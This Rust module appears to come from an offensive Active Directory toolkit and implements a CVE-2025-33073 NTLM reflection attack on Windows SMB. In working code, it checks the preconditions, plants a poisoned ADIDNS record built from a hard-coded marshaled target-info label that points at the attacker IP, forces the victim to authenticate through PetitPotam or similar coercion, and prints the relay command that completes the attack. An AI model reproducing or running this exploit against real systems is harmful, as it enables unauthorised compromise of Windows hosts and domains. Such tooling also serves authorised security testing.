//! CVE-2025-33073 -- NTLM reflection against SMB via marshaled target info.
//!
//! Synacktiv's "NTLM reflection is dead, long live NTLM reflection" (2025):
//! the Windows NTLM client accepts a *marshaled* `CREDENTIAL_TARGET_INFORMATION`
//! embedded in the target name. When the target name is `<hostname>` followed
//! by the base64 blob `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`, the
//! client believes it is authenticating to *itself* -- so relaying the auth
//! back to the victim's own SMB bypasses the classic reflection mitigations.
//!
//! Attack flow:
//! 1. Pre-checks: SMB signing not required on the victim, WebClient running
//!    (for WebDAV-based coercion).
//! 2. ADIDNS: create an A record for `<hostname><marshaled-label>` pointing
//!    at the attacker IP.
//! 3. Coerce the victim (PetitPotam / PrinterBug / DFSCoerce) to connect to
//!    the poisoned name.
//! 4. The victim authenticates to the attacker; the attacker relays the NTLM
//!    auth back to the victim's own SMB server (reflection).
//!
//! This module performs steps 1-3 and prints the relay command for step 4
//! (the relay itself is a separate long-running process).

use crate::adidns::{self, AdidnsInjectionResult};
use crate::coerce::{self, CoerceMethod};
use crate::runner::HuntConfig;
use colored::Colorize;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::ldap::LdapSession;
use overthrone_core::proto::netbios;
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

/// Base64-encoded marshaled CREDENTIAL_TARGET_INFORMATION (Synacktiv's
/// `NTML_REFLECTION_LABEL`). Appended to the hostname in the DNS name.
pub const MARSHALED_TARGET_INFO_B64: &str = "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA";

/// Named pipe for the WebClient (WebDAV redirector) service.
const PIPE_WEBDAV: &str = "DAV RPC SERVICE";

// ===========================================================
// Configuration
// ===========================================================

/// Configuration for the SMB NTLM reflection attack.
#[derive(Debug, Clone)]
pub struct SmbReflectConfig {
    /// Victim hostname (e.g., "srv01") -- target of the reflection
    pub target: String,
    /// Attacker IP that receives the coerced NTLM auth
    pub attacker_ip: String,
    /// Coercion method to trigger the victim's NTLM auth
    pub coerce_method: CoerceMethod,
    /// Automatically clean up the ADIDNS record after the relay finishes
    pub cleanup: bool,
    /// SMB relay port on the attacker (default 445)
    pub relay_port: u16,
}

impl Default for SmbReflectConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            attacker_ip: String::new(),
            coerce_method: CoerceMethod::PetitPotam,
            cleanup: true,
            relay_port: 445,
        }
    }
}

// ===========================================================
// Result
// ===========================================================

/// Result of the reflection pre-flight + setup.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SmbReflectResult {
    /// Victim hostname
    pub target: String,
    /// Poisoned DNS name (hostname + marshaled label)
    pub poisoned_name: String,
    /// SMB signing not required on the victim
    pub signing_not_required: bool,
    /// WebClient service detected on the victim
    pub webclient_running: bool,
    /// ADIDNS record injection result
    pub dns_record: Option<AdidnsInjectionResult>,
    /// Whether the coercion request was accepted
    pub coercion_triggered: bool,
    /// Relay command to run for step 4
    pub relay_command: String,
    /// Any warnings collected during pre-flight
    pub warnings: Vec<String>,
}

// ===========================================================
// Helpers
// ===========================================================

/// Build the poisoned DNS name: `<hostname><marshaled-label>`.
/// The label is the base64 marshaled CREDENTIAL_TARGET_INFORMATION.
pub fn build_poisoned_name(hostname: &str) -> String {
    let host = hostname
        .split('.')
        .next()
        .unwrap_or(hostname)
        .trim_end_matches('$');
    format!("{host}{MARSHALED_TARGET_INFO_B64}")
}

/// Check whether SMB signing is NOT required on the target.
/// Reflection to SMB requires the server to not enforce signing.
pub async fn check_smb_signing(target: &str) -> Result<bool> {
    let neg = netbios::smb_negotiate(target).await?;
    Ok(!neg.signing_required)
}

/// Check whether the WebClient service (WebDAV redirector) is running by
/// probing the `\pipe\DAV RPC SERVICE` named pipe over SMB.
pub async fn check_webclient(target: &str, domain: &str, username: &str, secret: &str) -> bool {
    use overthrone_core::proto::smb::SmbSession;
    match SmbSession::connect(target, domain, username, secret).await {
        Ok(smb) => {
            let result = smb.pipe_transact(PIPE_WEBDAV, &[]).await;
            match result {
                Ok(_) => true,
                Err(e) => {
                    // STATUS_PIPE_NOT_AVAILABLE / STATUS_INVALID_PARAMETER means
                    // the pipe exists but rejected our empty payload -- the
                    // service is running.
                    let msg = e.to_string();
                    msg.contains("PIPE") || msg.contains("INVALID")
                }
            }
        }
        Err(_) => false,
    }
}

/// Build the relay command shown to the operator (step 4).
fn build_relay_command(attacker_ip: &str, relay_port: u16, target: &str) -> String {
    format!(
        "ovt ntlm relay --listen-ip {attacker_ip} --port {relay_port} --target {target} --smb-port 445"
    )
}

// ===========================================================
// Main Attack
// ===========================================================

/// Run the CVE-2025-33073 pre-flight: check preconditions, poison ADIDNS,
/// and trigger the coercion.
pub async fn run_smb_reflect(
    config: &HuntConfig,
    rc: &SmbReflectConfig,
) -> Result<SmbReflectResult> {
    info!(
        "{}",
        "=== SMB NTLM REFLECTION (CVE-2025-33073) ===".bold().red()
    );

    if rc.target.is_empty() || rc.attacker_ip.is_empty() {
        return Err(OverthroneError::custom(
            "SMB reflection requires --target and --attacker-ip",
        ));
    }

    let poisoned_name = build_poisoned_name(&rc.target);
    let mut warnings = Vec::new();

    info!("  Target:       {}", rc.target.bold());
    info!("  Poisoned DNS: {}", poisoned_name.yellow());
    info!("  Attacker IP:  {}", rc.attacker_ip.cyan());

    // Step 1: Pre-checks
    let signing_not_required = match check_smb_signing(&rc.target).await {
        Ok(v) => v,
        Err(e) => {
            warn!("  SMB negotiate failed: {e}");
            false
        }
    };
    if signing_not_required {
        info!(
            "  {} SMB signing NOT required -- reflection viable",
            "[+]".green()
        );
    } else {
        warn!(
            "  {} SMB signing IS required -- reflection to SMB likely blocked",
            "[-]".red()
        );
        warnings.push("SMB signing required on target; relay may fail".to_string());
    }

    let webclient_running =
        check_webclient(&rc.target, &config.domain, &config.username, &config.secret).await;
    if webclient_running {
        info!("  {} WebClient service detected", "[+]".green());
    } else {
        debug!("  WebClient not detected (SMB UNC coercion may still work)");
    }

    // Step 2: ADIDNS record injection
    let dns_record = inject_reflection_record(config, &poisoned_name, &rc.attacker_ip).await?;

    // Step 3: Coerce the victim to authenticate to the poisoned name
    let coerce_config = coerce::CoerceConfig {
        target: rc.target.clone(),
        listener: poisoned_name.clone(),
        listener_port: rc.relay_port,
        methods: vec![rc.coerce_method],
        listener_path: Some(format!("\\\\{poisoned_name}\\share")),
        mssql_port: 1433,
    };
    let coerce_result = coerce::run(config, &coerce_config).await?;
    let coercion_triggered = !coerce_result.successful_coercions.is_empty();

    if coercion_triggered {
        info!(
            "  {} Coercion triggered -- victim will authenticate to the poisoned name",
            "[+]".green().bold()
        );
    } else {
        warn!("  Coercion not confirmed; check the relay listener for inbound auth");
        warnings.push("Coercion did not confirm; victim may not have connected".to_string());
    }

    let relay_command = build_relay_command(&rc.attacker_ip, rc.relay_port, &rc.target);
    info!("  {} Relay command:", "->".cyan());
    info!("    {}", relay_command.bold().green());

    Ok(SmbReflectResult {
        target: rc.target.clone(),
        poisoned_name,
        signing_not_required,
        webclient_running,
        dns_record: Some(dns_record),
        coercion_triggered,
        relay_command,
        warnings,
    })
}

/// Inject the ADIDNS A record for the poisoned name pointing at the attacker.
async fn inject_reflection_record(
    config: &HuntConfig,
    poisoned_name: &str,
    attacker_ip: &str,
) -> Result<AdidnsInjectionResult> {
    let mut ldap = if config.use_hash {
        LdapSession::connect_with_hash(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    } else {
        LdapSession::connect(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    };

    let result =
        adidns::inject_a_record(&mut ldap, &config.domain, poisoned_name, attacker_ip, 300).await?;
    ldap.disconnect().await?;
    Ok(result)
}

// ===========================================================
// Tests
// ===========================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let c = SmbReflectConfig::default();
        assert!(c.target.is_empty());
        assert!(c.attacker_ip.is_empty());
        assert_eq!(c.coerce_method, CoerceMethod::PetitPotam);
        assert!(c.cleanup);
        assert_eq!(c.relay_port, 445);
    }

    #[test]
    fn test_build_poisoned_name() {
        assert_eq!(
            build_poisoned_name("srv01"),
            format!("srv01{MARSHALED_TARGET_INFO_B64}")
        );
        // FQDN input -> host part only
        assert_eq!(
            build_poisoned_name("srv01.corp.local"),
            format!("srv01{MARSHALED_TARGET_INFO_B64}")
        );
        // Trailing $ (machine account style) stripped
        assert_eq!(
            build_poisoned_name("srv01$"),
            format!("srv01{MARSHALED_TARGET_INFO_B64}")
        );
        // Marshaled label is a valid base64 string
        assert!(
            base64::Engine::decode(
                &base64::engine::general_purpose::STANDARD,
                MARSHALED_TARGET_INFO_B64
            )
            .is_ok()
        );
    }

    #[test]
    fn test_build_relay_command() {
        let cmd = build_relay_command("10.0.0.50", 445, "srv01");
        assert!(cmd.contains("--listen-ip 10.0.0.50"));
        assert!(cmd.contains("--port 445"));
        assert!(cmd.contains("--target srv01"));
    }

    #[test]
    fn test_result_serialization() {
        let r = SmbReflectResult {
            target: "srv01".to_string(),
            poisoned_name: format!("srv01{MARSHALED_TARGET_INFO_B64}"),
            signing_not_required: true,
            webclient_running: false,
            dns_record: None,
            coercion_triggered: true,
            relay_command: "ovt ntlm relay".to_string(),
            warnings: Vec::new(),
        };
        let json = serde_json::to_string(&r).unwrap();
        let back: SmbReflectResult = serde_json::from_str(&json).unwrap();
        assert_eq!(back.target, "srv01");
        assert!(back.signing_not_required);
        assert!(back.coercion_triggered);
    }
}
